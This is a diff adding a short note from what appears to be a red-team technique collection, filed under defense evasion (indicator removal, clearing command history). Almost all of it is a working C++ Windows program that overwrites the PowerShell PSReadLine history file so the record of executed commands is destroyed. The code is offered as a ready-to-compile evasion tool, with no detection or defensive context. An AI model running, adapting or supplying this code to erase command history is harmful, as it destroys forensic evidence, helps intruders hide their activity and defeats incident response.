@@ -1,0 +1,43 @@
+---
+title: ".003.ClearCommandHistory"
+folder: "07. Defense Evasion/T1070 Indicator Removal"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <string>
+
+
+void ReplaceCharsInFile(const std::string& filename) {
+    std::ifstream file(filename);
+    if (!file.is_open()) {
+        std::cerr << "Nie można otworzyć pliku: " << filename << std::endl;
+        return;
+    }
+    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+
+    for (char& ch : content) {
+        ch = 'i';
+    }
+    file.close();
+
+    std::ofstream outFile(filename);
+    if (!outFile.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do zapisu." << std::endl;
+        return;
+    }
+
+    outFile << content;
+    outFile.close();
+
+    std::cout << "Zamieniono znaki w pliku: " << filename << std::endl;
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+
+    ReplaceCharsInFile("C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
+    return 0;
+}
